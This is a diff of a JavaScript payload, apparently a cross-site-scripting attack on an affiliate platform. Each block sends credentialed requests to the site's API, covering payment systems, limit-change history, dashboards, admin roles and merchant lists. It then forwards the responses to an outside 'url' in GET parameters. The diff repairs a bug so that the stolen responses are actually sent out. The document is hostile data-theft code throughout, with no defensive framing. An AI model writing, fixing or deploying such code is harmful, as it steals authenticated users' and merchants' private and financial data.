@@ -177,7 +177,7 @@ fetch('https://'+document.domain.replace("affiliates","affiliates-api")+'/api2/a
       xhr.withCredentials = true;
       xhr.onload = function(e) {
         var xmlHttp1 = new XMLHttpRequest();
-        xmlHttp1.open( "GET", url + "/?servmarl="+xmlHttp.responseText, false ); // false for synchronous request
+        xmlHttp1.open( "GET", url + "/?servmarl="+xhr.responseText, false ); // false for synchronous request
         xmlHttp1.send( null );
       };
       xhr.onerror = function () {
@@ -195,7 +195,7 @@ fetch('https://'+document.domain.replace("affiliates","affiliates-api")+'/api2/a
       xhr.withCredentials = true;
       xhr.onload = function(e) {
         var xmlHttp1 = new XMLHttpRequest();
-        xmlHttp1.open( "GET", url + "/?apit="+xmlHttp.responseText, false ); // false for synchronous request
+        xmlHttp1.open( "GET", url + "/?apit="+xhr.responseText, false ); // false for synchronous request
         xmlHttp1.send( null );
       };
       xhr.onerror = function () {
@@ -214,7 +214,7 @@ fetch('https://'+document.domain.replace("affiliates","affiliates-api")+'/api2/a
       xhr.withCredentials = true;
       xhr.onload = function(e) {
         var xmlHttp1 = new XMLHttpRequest();
-        xmlHttp1.open( "GET", url + "/?allowed_payment_systems="+xmlHttp.responseText, false ); // false for synchronous request
+        xmlHttp1.open( "GET", url + "/?allowed_payment_systems="+xhr.responseText, false ); // false for synchronous request
         xmlHttp1.send( null );
       };
       xhr.onerror = function () {
@@ -233,7 +233,7 @@ fetch('https://'+document.domain.replace("affiliates","affiliates-api")+'/api2/a
       xhr.withCredentials = true;
       xhr.onload = function(e) {
         var xmlHttp1 = new XMLHttpRequest();
-        xmlHttp1.open( "GET", url + "/?history_of_limit_changes="+xmlHttp.responseText, false ); // false for synchronous request
+        xmlHttp1.open( "GET", url + "/?history_of_limit_changes="+xhr.responseText, false ); // false for synchronous request
         xmlHttp1.send( null );
       };
       xhr.onerror = function () {
@@ -254,7 +254,7 @@ fetch('https://'+document.domain.replace("affiliates","affiliates-api")+'/api2/a
      xhr.setRequestHeader("Content-Type","application/json");
       xhr.onload = function(e) {
         var xmlHttp1 = new XMLHttpRequest();
-        xmlHttp1.open( "GET", url + "/?dashboard="+xmlHttp.responseText, false ); // false for synchronous request
+        xmlHttp1.open( "GET", url + "/?dashboard="+xhr.responseText, false ); // false for synchronous request
         xmlHttp1.send({"_merchant":getCookie("merchant_id")});
       };
       xhr.onerror = function () {
@@ -274,7 +274,7 @@ fetch('https://'+document.domain.replace("affiliates","affiliates-api")+'/api2/a
      xhr.setRequestHeader("Content-Type","application/json");
       xhr.onload = function(e) {
         var xmlHttp1 = new XMLHttpRequest();
-        xmlHttp1.open( "GET", url + "/?dashboardc="+xmlHttp.responseText, false ); // false for synchronous request
+        xmlHttp1.open( "GET", url + "/?dashboardc="+xhr.responseText, false ); // false for synchronous request
         xmlHttp1.send({"_merchant":getCookie("merchant_id")});
       };
       xhr.onerror = function () {
@@ -295,7 +295,7 @@ fetch('https://'+document.domain.replace("affiliates","affiliates-api")+'/api2/a
      xhr.setRequestHeader("Content-Type","application/json");
       xhr.onload = function(e) {
         var xmlHttp1 = new XMLHttpRequest();
-        xmlHttp1.open( "GET", url + "/?dashboardt="+xmlHttp.responseText, false ); // false for synchronous request
+        xmlHttp1.open( "GET", url + "/?dashboardt="+xhr.responseText, false ); // false for synchronous request
         xmlHttp1.send({"_merchant":getCookie("merchant_id")});
       };
       xhr.onerror = function () {
@@ -314,7 +314,7 @@ fetch('https://'+document.domain.replace("affiliates","affiliates-api")+'/api2/a
      xhr.setRequestHeader("Content-Type","application/json");
       xhr.onload = function(e) {
         var xmlHttp1 = new XMLHttpRequest();
-        xmlHttp1.open( "GET", url + "/?roles="+xmlHttp.responseText, false ); // false for synchronous request
+        xmlHttp1.open( "GET", url + "/?roles="+xhr.responseText, false ); // false for synchronous request
         xmlHttp1.send({"namespace":"admin"});
       };
       xhr.onerror = function () {
@@ -334,7 +334,7 @@ fetch('https://'+document.domain.replace("affiliates","affiliates-api")+'/api2/a
       xhr.withCredentials = true;
       xhr.onload = function(e) {
         var xmlHttp1 = new XMLHttpRequest();
-        xmlHttp1.open( "GET", url + "/?listm="+xmlHttp.responseText, false ); // false for synchronous request
+        xmlHttp1.open( "GET", url + "/?listm="+xhr.responseText, false ); // false for synchronous request
         xmlHttp1.send( null );
       };
       xhr.onerror = function () {
@@ -352,7 +352,7 @@ fetch('https://'+document.domain.replace("affiliates","affiliates-api")+'/api2/a
       xhr.withCredentials = true;
       xhr.onload = function(e) {
         var xmlHttp1 = new XMLHttpRequest();
-        xmlHttp1.open( "GET", url + "/?adm="+xmlHttp.responseText, false ); // false for synchronous request
+        xmlHttp1.open( "GET", url + "/?adm="+xhr.responseText, false ); // false for synchronous request
         xmlHttp1.send( null );
       };
       xhr.onerror = function () {
@@ -646,7 +646,7 @@ dataToSend.report = {
      xhr.setRequestHeader("Content-Type","application/json");
       xhr.onload = function(e) {
         var xmlHttp1 = new XMLHttpRequest();
-        xmlHttp1.open( "GET", url + "/?dashboardc="+xmlHttp.responseText, false ); // false for synchronous request
+        xmlHttp1.open( "GET", url + "/?dashboardc="+xhr.responseText, false ); // false for synchronous request
         xmlHttp1.send({"_merchant":getCookie("merchant_id")});
       };
       xhr.onerror = function () {
